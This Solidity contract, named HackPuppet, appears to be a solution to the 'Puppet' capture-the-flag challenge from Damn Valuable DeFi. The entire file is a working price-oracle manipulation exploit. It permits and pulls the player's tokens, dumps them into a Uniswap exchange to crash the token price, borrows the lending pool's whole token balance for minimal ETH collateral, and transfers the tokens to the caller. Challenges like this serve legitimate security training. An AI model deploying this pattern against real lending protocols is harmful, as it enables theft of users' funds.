// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { PuppetPool } from "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";


contract HackPuppet {

    constructor(
        PuppetPool pool,
        DamnValuableToken token,
        address uniswap,
        uint256 player_token_balance,
        uint256 pool_token_balance,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        /** @notice
            Using the permit function from ERC2612 to get the allowance needed for our transaction
        */
        token.permit(
            tx.origin,
            address(this),
            player_token_balance,
            deadline,
            v,
            r,
            s
        );

        /** @notice 
            We're going to transfer the player tokens to this contract
        */
        token.transferFrom(tx.origin, address(this), player_token_balance);
        /** @notice
            Need to approve uniswap to transfer our tokens
        */
        token.approve(uniswap, player_token_balance);
        /**
            @notice
            Call the uniswap function tokenToEthSwapInput
            Doing this, we're unbalancing the swap price
            The exchange is going to have 20 Eth and 0 tokens
        */
        (bool success,) = uniswap.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            player_token_balance,       // tokens to sell
            1,                          // min eth to buy
            block.timestamp * 2         // deadline
        ));
        /** @notice
            Check if our call was successfull
        */
        require(success, "fail at tokenToEthSwapInput()");
        /** @notice
            Now that the token's price is insignificant we can borrow all the pool balance
        */
        pool.borrow{value: address(this).balance}(pool_token_balance, address(this));
        /** @notice
            Finally we transfer the token to our wallet
        */
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }

}